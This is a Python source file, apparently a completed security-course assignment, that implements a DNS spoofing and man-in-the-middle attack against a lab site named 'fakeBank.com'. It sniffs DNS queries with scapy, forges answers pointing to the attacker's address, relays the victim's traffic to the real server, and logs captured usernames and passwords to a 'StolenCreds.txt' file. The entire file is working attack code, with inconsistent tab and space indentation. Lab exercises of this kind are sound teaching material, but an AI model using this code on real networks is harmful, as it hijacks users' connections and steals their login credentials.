import argparse
import socket
from scapy.all import *

conf.L3socket = L3RawSocket
WEB_PORT = 8000
HOSTNAME = "fakeBank.com"

def getQueryDict(query):
    # create a query dictionary from a query
    query = query.replace("'","")
    query = query[query.find("username"):]

    try:
        query_dict = dict(q.split("=") for q in query.split("&"))
    except ValueError:
        query_dict = None
    return query_dict


def resolveHostname(hostname):
	# IP address of HOSTNAME. Used to forward tcp connection. 
	# Normally obtained via DNS lookup.
	return "127.1.1.1"

def log_credentials(username, password):
	# Write stolen credentials out to file
	with open("lib/attacker/StolenCreds.txt","wb") as fd:
		fd.write("Stolen credentials: username="+username+" password="+password)

def check_credentials(client_data):
	post_str = "POST"
	if client_data[:len(post_str)] == post_str:
		if "username" in client_data and "password" in client_data:
			params = getQueryDict(client_data)
			log_credentials(params["username"], params["password"])
			
	# TODO: Take a block of client data and search for username/password credentials
	# If found, log the credentials to the system by calling log_credentials().
	#raise NotImplementedError

def handle_tcp_forwarding(client_socket, client_ip, hostname):
	while True:
	        (conn_socket, address) = client_socket.accept()
                
                #if address != client_ip:
                #    return

		bank_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		bank_socket.connect((resolveHostname(hostname), WEB_PORT))

		client_data = conn_socket.recv(50000)
                print client_data
		check_credentials(client_data)
		bank_socket.send(client_data)

		bank_response = bank_socket.recv(50000)
		conn_socket.send(bank_response)
                
                conn_socket.close()
                bank_socket.close()

                if "POST /post_logout" in client_data:
                    client_socket.close()
                    exit(0)

	
		# TODO: accept a new connection from the client on client_socket and
		# create a new socket to connect to the actual host associated with hostname
		

		# TODO: read data from client socket, check for credentials, and forward along to
		# host socket. Check for POST to '/post_logout' and exit after that request has completed.

		#raise NotImplementedError

def dns_callback(packet,extra_args):
	src_ip = extra_args[0]
	serversocket = extra_args[1]
	dns = packet[DNS]
	if HOSTNAME in dns['DNS Question Record'].qname:
		udp = packet[UDP]
		spoof_pckt = IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=udp.sport, sport=udp.dport)/ \
			DNS(id = dns.id, qr=1, qd=dns.qd, an= \
			DNSRR(rrname=dns['DNS Question Record'].qname, rdata=src_ip))
		send(spoof_pckt)

	handle_tcp_forwarding(serversocket, src_ip, HOSTNAME)

	# TODO: Write callback function for handling DNS packets.
	# Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof

def sniff_and_spoof(source_ip):
	# TODO: Open a socket and bind it to the attacker's IP and WEB_PORT
	# This socket will be used to accept connections from victimized clients
	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	serversocket.bind((source_ip, WEB_PORT))
	serversocket.listen(5)

	cb = lambda originalArg, args=(source_ip, serversocket):dns_callback(originalArg,args)
	packet = sniff(filter="port 53", prn=cb)
	# TODO: sniff for DNS packets on the network. Make sure to pass source_ip
	# and the socket you created as extra callback arguments. 

def main():
	parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
	parser.add_argument('--source_ip',nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')

	args = parser.parse_args()
	sniff_and_spoof(args.source_ip)

if __name__=="__main__":
	main()
